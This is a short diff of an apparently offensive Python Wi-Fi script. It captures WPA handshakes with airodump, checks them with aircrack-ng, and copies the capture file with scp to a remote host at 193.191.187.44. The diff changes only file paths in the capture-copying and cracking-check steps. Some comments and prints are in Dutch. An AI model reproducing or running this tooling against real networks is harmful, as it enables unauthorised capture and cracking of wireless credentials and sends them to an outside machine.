@@ -29,7 +29,7 @@ def check_routine (BSSID, proc_airodump):
 		check_routine(BSSID, proc_airodump)
 	else:
 		print ("gelukt")
-		os.system("scp home/isis/isis/psk-01.cap isis@193.191.187.44:.")
+		os.system("scp home/isis/psk/psk-01.cap isis@193.191.187.44:.")
 		os.kill(proc_airodump.pid, SIGINT)
 
 def hand_assignment(BSSID, ESSID):
@@ -53,7 +53,7 @@ def check_capture(BSSID):
 	uit=True
 	command=["sudo", "aircrack-ng","-b"]
 	command.append(BSSID)
-	command.append("psk-01.cap")
+	command.append("/home/isis/psk/psk-01.cap")
 	DN= open(os.devnull, "w")
 	output= subprocess.check_output(command, stderr=DN)
 	if "No valid WPA handshakes found" in output or "Got no data packets from target network" in output:
